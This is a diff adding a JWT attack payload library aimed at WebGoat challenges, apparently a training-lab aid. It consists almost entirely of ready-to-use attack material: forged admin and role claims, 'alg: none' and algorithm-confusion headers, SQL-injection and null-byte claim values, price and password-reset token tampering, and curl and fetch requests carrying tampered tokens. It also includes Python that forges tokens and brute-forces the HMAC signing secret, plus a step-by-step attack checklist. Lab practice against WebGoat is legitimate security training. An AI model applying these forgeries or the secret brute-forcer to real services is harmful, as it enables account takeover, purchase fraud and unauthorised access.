@@ -1,0 +1,657 @@
+===============================================
+  JWT PAYLOADS & EXAMPLES LIBRARY
+===============================================
+
+This file contains ready-to-use JWT payloads for common WebGoat challenges.
+
+===============================================
+  BASIC JWT EXAMPLES
+===============================================
+
+EXAMPLE 1: Simple User Token
+------------------------------
+Header:
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+Payload:
+{
+  "sub": "user123",
+  "name": "John Doe",
+  "iat": 1609459200
+}
+
+Full Token:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNjA5NDU5MjAwfQ.signature
+
+EXAMPLE 2: Admin Token
+------------------------
+Payload:
+{
+  "sub": "admin",
+  "name": "Administrator",
+  "admin": true,
+  "role": "admin",
+  "iat": 1609459200
+}
+
+EXAMPLE 3: Token with Expiration
+----------------------------------
+Payload:
+{
+  "sub": "user123",
+  "iat": 1609459200,
+  "exp": 9999999999
+}
+Note: exp set far in future to prevent expiration
+
+===============================================
+  ATTACK PAYLOADS
+===============================================
+
+PAYLOAD 1: Basic Admin Escalation
+-----------------------------------
+Change this:
+{
+  "sub": "user123",
+  "admin": false
+}
+
+To this:
+{
+  "sub": "user123",
+  "admin": true
+}
+
+PAYLOAD 2: Role Change
+-----------------------
+Change this:
+{
+  "sub": "user123",
+  "role": "user"
+}
+
+To this:
+{
+  "sub": "user123",
+  "role": "admin"
+}
+
+PAYLOAD 3: Username to Admin
+------------------------------
+Change this:
+{
+  "sub": "john_doe",
+  "name": "John Doe"
+}
+
+To this:
+{
+  "sub": "admin",
+  "name": "admin"
+}
+
+PAYLOAD 4: Multiple Admin Flags
+---------------------------------
+{
+  "sub": "admin",
+  "name": "admin",
+  "admin": true,
+  "isAdmin": true,
+  "role": "admin",
+  "roles": ["admin", "superuser"],
+  "authorities": ["ROLE_ADMIN"],
+  "permissions": ["read", "write", "delete"]
+}
+
+PAYLOAD 5: SQL Injection
+-------------------------
+{
+  "sub": "admin' OR '1'='1",
+  "name": "admin' OR '1'='1"
+}
+
+Alternative:
+{
+  "sub": "admin'--",
+  "name": "admin'--"
+}
+
+PAYLOAD 6: Price Manipulation
+-------------------------------
+Original:
+{
+  "item": "laptop",
+  "price": 999,
+  "user": "user123"
+}
+
+Tampered:
+{
+  "item": "laptop",
+  "price": 0,
+  "user": "user123"
+}
+
+PAYLOAD 7: Quantity Manipulation
+----------------------------------
+Original:
+{
+  "item": "phone",
+  "quantity": 1,
+  "price": 599
+}
+
+Tampered:
+{
+  "item": "phone",
+  "quantity": -1,
+  "price": 599
+}
+Note: Negative quantity might credit your account!
+
+PAYLOAD 8: Extended Expiration
+--------------------------------
+Original:
+{
+  "sub": "user123",
+  "exp": 1609459200
+}
+
+Tampered:
+{
+  "sub": "user123",
+  "exp": 9999999999
+}
+
+===============================================
+  ALGORITHM CONFUSION PAYLOADS
+===============================================
+
+HEADER 1: Algorithm "none"
+----------------------------
+Original:
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+Tampered:
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+Token format: header.payload.
+
+HEADER 2: HS256 (from RS256)
+------------------------------
+Original:
+{
+  "alg": "RS256",
+  "typ": "JWT"
+}
+
+Tampered:
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+Note: Sign with public key as HMAC secret
+
+HEADER 3: Algorithm Variations
+--------------------------------
+Try these algorithms if standard doesn't work:
+- "alg": "None"
+- "alg": "NONE"
+- "alg": "nOnE"
+- "alg": ""
+- "alg": null
+
+===============================================
+  PASSWORD RESET PAYLOADS
+===============================================
+
+PAYLOAD 1: Basic Reset Token
+------------------------------
+Your token:
+{
+  "sub": "youruser",
+  "action": "password_reset",
+  "iat": 1609459200,
+  "exp": 1609462800
+}
+
+Tampered:
+{
+  "sub": "admin",
+  "action": "password_reset",
+  "iat": 1609459200,
+  "exp": 9999999999
+}
+
+PAYLOAD 2: Reset with Email
+-----------------------------
+Your token:
+{
+  "email": "you@example.com",
+  "username": "youruser",
+  "resetToken": "abc123"
+}
+
+Tampered:
+{
+  "email": "admin@example.com",
+  "username": "admin",
+  "resetToken": "abc123"
+}
+
+===============================================
+  SPECIAL PAYLOADS
+===============================================
+
+PAYLOAD: Token Confusion
+--------------------------
+If server checks multiple fields, set them all:
+{
+  "sub": "admin",
+  "user": "admin",
+  "username": "admin",
+  "name": "admin",
+  "id": "admin",
+  "userId": "admin",
+  "email": "admin@webgoat.com"
+}
+
+PAYLOAD: Null Byte Injection
+------------------------------
+{
+  "sub": "admin\u0000user",
+  "name": "admin\u0000user"
+}
+Note: Null byte might truncate string
+
+PAYLOAD: Array Confusion
+-------------------------
+Original:
+{
+  "sub": "user123",
+  "roles": ["user"]
+}
+
+Try:
+{
+  "sub": "user123",
+  "roles": ["user", "admin"]
+}
+
+Or:
+{
+  "sub": ["user123", "admin"]
+}
+
+PAYLOAD: Object Injection
+--------------------------
+{
+  "sub": {"username": "admin", "role": "admin"},
+  "admin": true
+}
+
+===============================================
+  SHOPPING CART PAYLOADS
+===============================================
+
+PAYLOAD 1: Free Purchase
+-------------------------
+Original:
+{
+  "cart": [
+    {"item": "laptop", "price": 999, "quantity": 1}
+  ],
+  "total": 999,
+  "user": "user123"
+}
+
+Attack 1 - Zero price:
+{
+  "cart": [
+    {"item": "laptop", "price": 0, "quantity": 1}
+  ],
+  "total": 0,
+  "user": "user123"
+}
+
+Attack 2 - Negative price:
+{
+  "cart": [
+    {"item": "laptop", "price": -999, "quantity": 1}
+  ],
+  "total": -999,
+  "user": "user123"
+}
+
+Attack 3 - Zero total:
+{
+  "cart": [
+    {"item": "laptop", "price": 999, "quantity": 1}
+  ],
+  "total": 0,
+  "user": "user123"
+}
+
+PAYLOAD 2: Discount Manipulation
+----------------------------------
+Original:
+{
+  "items": ["laptop"],
+  "discount": 0.1,
+  "user": "user123"
+}
+
+Tampered:
+{
+  "items": ["laptop"],
+  "discount": 1.0,
+  "user": "user123"
+}
+Or:
+{
+  "items": ["laptop"],
+  "discount": 100,
+  "user": "user123"
+}
+
+===============================================
+  AUTHORIZATION BYPASS PAYLOADS
+===============================================
+
+PAYLOAD 1: Admin Document Access
+----------------------------------
+Original:
+{
+  "sub": "user123",
+  "canAccessAdmin": false,
+  "documentId": "user_doc_1"
+}
+
+Tampered:
+{
+  "sub": "user123",
+  "canAccessAdmin": true,
+  "documentId": "admin_doc_1"
+}
+
+PAYLOAD 2: Feature Flags
+--------------------------
+{
+  "sub": "user123",
+  "features": {
+    "adminPanel": true,
+    "deleteUsers": true,
+    "viewLogs": true,
+    "exportData": true
+  }
+}
+
+PAYLOAD 3: Permission Bypass
+------------------------------
+{
+  "sub": "user123",
+  "permissions": {
+    "read": true,
+    "write": true,
+    "delete": true,
+    "admin": true
+  }
+}
+
+===============================================
+  JSON INJECTION PAYLOADS
+===============================================
+
+PAYLOAD 1: Extra Fields
+-------------------------
+Add extra fields that might be processed:
+{
+  "sub": "user123",
+  "name": "John",
+  "admin": true,
+  "isAdmin": true,
+  "role": "admin",
+  "superuser": true,
+  "root": true,
+  "elevated": true
+}
+
+PAYLOAD 2: Boolean Bypass
+---------------------------
+Try different boolean representations:
+- "admin": true
+- "admin": "true"
+- "admin": 1
+- "admin": "1"
+- "admin": "yes"
+- "admin": "Y"
+
+PAYLOAD 3: Type Confusion
+---------------------------
+Original:
+{
+  "userId": 123,
+  "admin": false
+}
+
+Try:
+{
+  "userId": "123",
+  "admin": "false"
+}
+Or:
+{
+  "userId": ["123"],
+  "admin": [false, true]
+}
+
+===============================================
+  CURL COMMAND EXAMPLES
+===============================================
+
+EXAMPLE 1: Simple GET with JWT
+--------------------------------
+curl -X GET http://192.168.254.112:8001/WebGoat/JWT/admin \
+  -H "Authorization: Bearer eyJhbGci...token...here"
+
+EXAMPLE 2: POST with Tampered Token
+-------------------------------------
+curl -X POST http://192.168.254.112:8001/WebGoat/JWT/purchase \
+  -H "Authorization: Bearer TAMPERED_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"item": "laptop", "price": 0}'
+
+EXAMPLE 3: Password Reset
+---------------------------
+curl -X POST http://192.168.254.112:8001/WebGoat/PasswordReset/reset \
+  -H "Authorization: Bearer TAMPERED_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"password": "hacked123"}'
+
+EXAMPLE 4: With Cookie
+------------------------
+curl -X GET http://192.168.254.112:8001/WebGoat/JWT/profile \
+  -H "Cookie: JWT=eyJhbGci...token...here" \
+  -H "Authorization: Bearer eyJhbGci...token...here"
+
+EXAMPLE 5: Multiple Headers
+-----------------------------
+curl -X POST http://192.168.254.112:8001/WebGoat/JWT/admin \
+  -H "Authorization: Bearer TAMPERED_TOKEN" \
+  -H "Content-Type: application/json" \
+  -H "X-Requested-With: XMLHttpRequest" \
+  -H "User-Agent: WebGoat Client" \
+  -d '{"action": "become_admin"}'
+
+===============================================
+  PYTHON SCRIPT EXAMPLES
+===============================================
+
+EXAMPLE 1: Decode JWT
+----------------------
+import jwt
+import json
+
+token = "eyJhbGci...your_token...here"
+decoded = jwt.decode(token, options={"verify_signature": False})
+print(json.dumps(decoded, indent=2))
+
+EXAMPLE 2: Encode JWT (Unsigned)
+----------------------------------
+import jwt
+import json
+
+header = {"alg": "none", "typ": "JWT"}
+payload = {"sub": "admin", "admin": True}
+
+# Encode without signature
+token = jwt.encode(payload, "", algorithm="none")
+print(token)
+
+EXAMPLE 3: Sign with Secret
+-----------------------------
+import jwt
+
+payload = {"sub": "admin", "admin": True}
+secret = "webgoat"
+
+token = jwt.encode(payload, secret, algorithm="HS256")
+print(token)
+
+EXAMPLE 4: Brute Force (Simple)
+---------------------------------
+import jwt
+import hmac
+import hashlib
+
+token = "your_jwt_token_here"
+wordlist = ["secret", "password", "webgoat", "123456"]
+
+parts = token.split('.')
+message = f"{parts[0]}.{parts[1]}"
+
+for secret in wordlist:
+    sig = hmac.new(
+        secret.encode(),
+        message.encode(),
+        hashlib.sha256
+    ).digest()
+    
+    # Base64url encode
+    import base64
+    sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
+    
+    if sig_b64 == parts[2]:
+        print(f"Found secret: {secret}")
+        break
+
+===============================================
+  BROWSER CONSOLE EXAMPLES
+===============================================
+
+EXAMPLE 1: Decode JWT in Browser
+----------------------------------
+function decodeJWT(token) {
+  const parts = token.split('.');
+  const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
+  const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
+  console.log('Header:', header);
+  console.log('Payload:', payload);
+  return {header, payload};
+}
+
+// Usage:
+decodeJWT('eyJhbGci...your_token');
+
+EXAMPLE 2: Send Request with JWT
+----------------------------------
+fetch('http://192.168.254.112:8001/WebGoat/JWT/admin', {
+  method: 'GET',
+  headers: {
+    'Authorization': 'Bearer YOUR_TAMPERED_TOKEN'
+  }
+})
+.then(r => r.json())
+.then(console.log)
+.catch(console.error);
+
+EXAMPLE 3: POST with Body
+---------------------------
+fetch('http://192.168.254.112:8001/WebGoat/JWT/purchase', {
+  method: 'POST',
+  headers: {
+    'Authorization': 'Bearer YOUR_TAMPERED_TOKEN',
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({item: 'laptop', price: 0})
+})
+.then(r => r.json())
+.then(console.log);
+
+===============================================
+  COMMON WEBGOAT JWT ENDPOINTS
+===============================================
+
+GET Endpoints:
+- /WebGoat/JWT/admin
+- /WebGoat/JWT/profile
+- /WebGoat/JWT/user
+- /WebGoat/JWT/validate
+- /WebGoat/JWT/verify
+
+POST Endpoints:
+- /WebGoat/JWT/login
+- /WebGoat/JWT/purchase
+- /WebGoat/JWT/checkout
+- /WebGoat/JWT/reset
+- /WebGoat/PasswordReset/reset
+
+===============================================
+  CHECKLIST FOR EACH CHALLENGE
+===============================================
+
+□ Capture original JWT token
+□ Decode token to see structure
+□ Identify target field to modify
+□ Try tampering attack
+□ Try algorithm "none"
+□ Try removing signature
+□ If needed, brute force secret
+□ Test tampered token
+□ Verify success
+□ Document what worked
+
+===============================================
+  FINAL TIPS
+===============================================
+
+✓ Start simple (tampering) before complex (brute force)
+✓ Always decode token first
+✓ Try multiple variations of payloads
+✓ Check server response for clues
+✓ Use browser DevTools to inspect traffic
+✓ Keep notes of what works
+✓ Common secrets: webgoat, secret, password
+✓ Try algorithm "none" early
+✓ Don't forget to remove signature when using "none"
+
+===============================================
+  READY TO ATTACK!
+===============================================
+
+Use these payloads in:
+- jwt_complete_toolkit.html
+- jwt_automation.ps1
+- curl commands
+- Browser console
+- Python scripts
+
+Good luck! 🔐
